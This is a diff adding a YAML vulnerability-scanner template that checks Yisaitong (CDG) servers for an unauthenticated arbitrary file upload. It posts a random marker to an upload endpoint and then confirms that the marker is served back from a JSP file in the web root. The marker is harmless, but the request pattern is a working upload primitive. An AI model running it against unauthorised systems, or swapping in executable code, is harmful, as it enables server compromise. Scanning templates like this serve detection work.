@@ -1,0 +1,20 @@
+name: poc-yisaitong-SC-fileupload
+set:
+  randbody: randomLowercase(32)
+rules:
+  - method: POST
+    path: "/CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBLAOLBAKBNDHLIGBKEOJLICAIDMGEDJKGP"
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+      Content-Type: multipart/form-data;boundary=----WebKitFormBoundarymVk33liI64J7GQaK
+    body: "
+      {{randbody}}
+      "
+    expression: | 
+      response.status == 200
+  - method: GET
+    path: '/N0th1ng.jsp'
+    expression: |
+      response.status == 200 && response.body.bcontains(b'{{randbody}}')
+detail:
+  author: test
